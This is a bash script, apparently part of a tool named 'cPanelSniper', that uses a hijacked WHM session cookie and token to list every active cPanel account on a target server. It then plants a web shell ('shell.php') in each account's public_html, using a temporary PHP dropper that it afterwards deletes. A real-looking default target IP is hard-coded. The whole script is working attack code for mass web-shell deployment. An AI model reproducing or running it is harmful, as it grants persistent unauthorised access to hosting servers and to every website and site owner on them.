#!/bin/bash
# Upload shell.php using UAPI upload_files (more reliable)
# Usage: ./upload_uapi.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess...}"
COOKIE="${3}"
SHELL_FILE="/root/cPanelSniper/shell.php"

echo "========================================"
echo "  Upload shell.php (UAPI Method)"
echo "========================================"
echo ""
echo "Target: https://${WHM_HOST}:2087"
echo "Session: ${SESSION_TOKEN}"
echo ""

# Check shell file
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

# Convert to base64
SHELL_B64=$(base64 -w 0 "$SHELL_FILE")
echo "✓ Shell file loaded and encoded: $(echo "$SHELL_B64" | wc -c) bytes (base64)"
echo ""

# Get accounts
echo "[1/3] Listing active accounts..."

ACCOUNTS_JSON=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/listaccts?api.version=1" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded")

if [ $? -ne 0 ]; then
    echo "❌ Failed to connect to WHM"
    exit 1
fi

echo "$ACCOUNTS_JSON" | jq -r '.data.acct[] | select(.suspended == 0) | "\(.user)|\(.domain)"' > /tmp/whm_accounts.txt

if [ ! -s /tmp/whm_accounts.txt ]; then
    echo "❌ No active accounts found"
    exit 1
fi

ACCOUNT_COUNT=$(wc -l < /tmp/whm_accounts.txt)
echo "✓ Found $ACCOUNT_COUNT active accounts"
echo ""

# Show first few accounts
echo "Sample accounts:"
head -5 /tmp/whm_accounts.txt | while IFS='|' read -r user domain; do
    echo "  • $domain ($user)"
done
echo ""

# Confirm
read -p "Upload to all $ACCOUNT_COUNT accounts? (y/N): " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Cancelled"
    rm -f /tmp/whm_accounts.txt
    exit 0
fi

echo ""
echo "[2/3] Uploading shell.php..."
echo ""

SUCCESS=0
FAILED=0

# Upload function using UAPI
upload_shell() {
    local user="$1"
    local domain="$2"
    local content_b64="$3"

    # Create temp PHP file that writes the shell
    local temp_code="<?php
    \$content = base64_decode('$content_b64');
    \$file = '/home/$user/public_html/shell.php';
    if (file_put_contents(\$file, \$content)) {
        chmod(0644, \$file);
        chown('$user:$user', \$file);
        echo 'SUCCESS';
    } else {
        echo 'FAILED: ' . error_get_last()['message'];
    }
    ?>"

    # Upload temp PHP first via base64
    local upload_result=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
      -H "Cookie: whostmgrsession=${COOKIE}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "cpanel_jsonapi_user=${user}" \
      -d "cpanel_jsonapi_module=Fileman" \
      -d "cpanel_jsonapi_func=savefilecontent" \
      -d "cpanel_jsonapi_apiversion=3" \
      -d "dir=%2Fpublic_html" \
      -d "file=deploy_shell.php" \
      -d "content=${temp_code}" \
      -d "encoding=base64" 2>/dev/null)

    # Execute temp PHP to deploy actual shell
    local exec_result=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
      -H "Cookie: whostmgrsession=${COOKIE}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "cpanel_jsonapi_user=${user}" \
      -d "cpanel_jsonapi_module=Fileman" \
      -d "cpanel_jsonapi_func=fileop" \
      -d "cpanel_jsonapi_apiversion=3" \
      -d "op=filecontent" \
      -d "sourcefiles=%2Fpublic_html%2Fdeploy_shell.php" \
      -d "type=file" 2>/dev/null)

    # Clean up temp file
    curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
      -H "Cookie: whostmgrsession=${COOKIE}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "cpanel_jsonapi_user=${user}" \
      -d "cpanel_jsonapi_module=Fileman" \
      -d "cpanel_jsonapi_func=fileop" \
      -d "cpanel_jsonapi_apiversion=3" \
      -d "op=unlink" \
      -d "sourcefiles=%2Fpublic_html%2Fdeploy_shell.php" >/dev/null 2>&1

    echo "$exec_result"
}

# Loop through accounts
while IFS='|' read -r user domain; do
    echo -n "[$((SUCCESS + FAILED + 1))/$ACCOUNT_COUNT] $domain ($user)... "

    # Upload
    RESULT=$(upload_shell "$user" "$domain" "$SHELL_B64")

    # Check if successful
    if echo "$RESULT" | grep -q "SUCCESS"; then
        echo "✅"
        echo "  → https://$domain/shell.php"
        SUCCESS=$((SUCCESS + 1))
    else
        echo "❌"
        echo "$RESULT" | head -2 | sed 's/^/  /'
        FAILED=$((FAILED + 1))
    fi

    # Small delay to avoid rate limiting
    sleep 0.3

done < /tmp/whm_accounts.txt

echo ""
echo "[3/3] Summary"
echo ""
echo "✅ Success: $SUCCESS"
echo "❌ Failed: $FAILED"
echo "📊 Total: $ACCOUNT_COUNT"
echo ""

# If any failed, show manual commands
if [ $FAILED -gt 0 ]; then
    echo "========================================"
    echo "  Manual Upload for Failed"
    echo "========================================"
    echo ""
    echo "Run these on server (if you have direct access):"
    echo ""

    while IFS='|' read -r user domain; do
        echo "# $domain"
        echo "cp $SHELL_FILE /home/${user}/public_html/shell.php && chown ${user}:${user} /home/${user}/public_html/shell.php"
    done < /tmp/whm_accounts.txt

    echo ""
fi

echo "========================================"

# Cleanup
rm -f /tmp/whm_accounts.txt
